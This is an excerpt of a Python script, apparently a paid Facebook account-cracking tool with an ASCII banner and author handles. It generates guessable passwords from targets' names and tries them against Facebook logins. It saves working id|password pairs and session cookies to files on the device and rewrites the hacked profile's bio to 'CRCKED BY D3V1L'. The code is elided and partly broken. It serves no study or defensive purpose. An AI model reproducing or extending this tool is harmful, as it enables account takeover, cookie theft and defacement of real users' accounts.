...
d8888b. d8888b. db    db  db db      
88  `8D VP  `8D 88    88 o88 88      
88   88   oooY' Y8    8P  88 88      
88   88   ~~~b. `8b  d8'  88 88      
88  .8D db   8D  `8bd8'   88 88booo. 
Y8888D' Y8888P'    YP     VP Y88888P 
 ----------------------------------------------
 Author    : TANVIR AHMED
 Github    : LOADING.......
 Facebook  : D3V1LxTANVIR
 Tool Name : FILE-PRO
 Type type : PAID
 Version   : 0.0
 [THANKS SAIMUN VAI]
		...
		for user in fo:
			...
			if len(frs)<=2:
				...
				try:
					...
					if len(lss)<=3 or (lss) == 'khan' or (lss) == 'islam' or (lss) == 'akter' or (lss) == 'rahman' or (lss) == 'ahmed' or (lss) == 'jahan' or (lss) == 'ahmmed' or (lss) == 'ali':
						pass
					else:
						pwv.append(lss+'123')
						pwv.append(lss+'1234')
						...
						try:
							lsd = name.split(' ')[2]
							if len(lsd)<=3 or (lsd) == 'khan' or (lsd) == 'islam' or (lsd) == 'akter' or (lsd) == 'rahman' or (lsd) == 'ahmed' or (lsd) == 'jahan' or (lsd) == 'ahmmed' or (lss) == 'ali':
								pass
							else:
								pwv.append(lsd+'123')
						except:
...
def crack1(idf,pwv):
	...
	sys.stdout.write(f"\r [SAIMON] {loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
   # sys.stdout.flush)
	sys.stdout.write('\r\033[1;37m [D3V1L] %s|\033[1;32mOK:-%s\033[1;37m\r'%(loop,len(oks)));sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				print (' \x1b[1;92m[D-OK] '+idf+'|'+pw)
				open('/sdcard/D3V1L-ok.txt','a').write(idf+'|'+pw+'\n')
				try:
					pi = ses.get('https://m.facebook.com/').text
					cookies=ses.cookies.get_dict()
					data ={"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(pi)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(pi)).group(1), 'bio':"CRCKED BY D3V1L('DCSS TEAM SUPPPRT ALL US ')"}
				...
				open('/sdcard/D3V1L-koki.txt','a').write(cokii+'\n')
				
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print (f' [D-CP] '+idf+'|'+pw)
				open('/sdcard/D3V1L-cp.txt','a').write(idf+'|'+pw+'\n')
				break
